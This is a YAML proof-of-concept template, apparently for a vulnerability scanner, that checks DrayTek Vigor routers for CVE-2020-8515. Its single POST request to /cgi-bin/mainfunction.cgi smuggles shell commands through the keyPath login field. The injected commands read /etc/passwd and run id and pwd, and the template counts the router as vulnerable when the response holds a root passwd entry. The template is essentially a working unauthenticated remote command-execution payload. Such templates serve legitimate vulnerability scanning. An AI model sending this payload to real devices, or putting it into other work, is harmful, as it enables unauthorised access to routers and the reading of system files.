name: yaml-poc-draytek-vigor2960-unauthorized_access-CVE-2020-8515
binding: a92d3bb4-3424-455d-8fc0-f8d22e3be2d0
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/156979/DrayTek-Vigor2960-Vigor3900-Vigor300B-Remote-Command-Execution.html
        - https://cxsecurity.com/issue/WLB-2020040007
        - https://nvd.nist.gov/vuln/detail/CVE-2020-8515
        - https://packetstormsecurity.com/files/156979/DrayTek-Vigor2960-Vigor3900-Vigor300B-Remote-Command-Execution.html
        - https://sku11army.blogspot.com/2020/01/draytek-unauthenticated-rce-in-draytek.html
        - https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-%28cve-2020-8515%29/
        - https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-(cve-2020-8515)/
        - https://www.exploit-db.com/exploits/48268
    vulnerability:
        id: 17fe452c-91f7-4ea2-bdff-dabac02a59af
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /cgi-bin/mainfunction.cgi
            headers:
                Content-Type: text/plain; charset=UTF-8
            body: action=login&keyPath=%27%0A%2fbin%2fcat${IFS}%2f/etc/passwd%26id%26pwd&loginUser=a&loginPwd=a
        expression: response.status == 200 && response.body.bcontains(b"uid") && response.body.bcontains(b"gid") && "root:[x*]:0:0:".bmatches(response.body)
expression: r0()
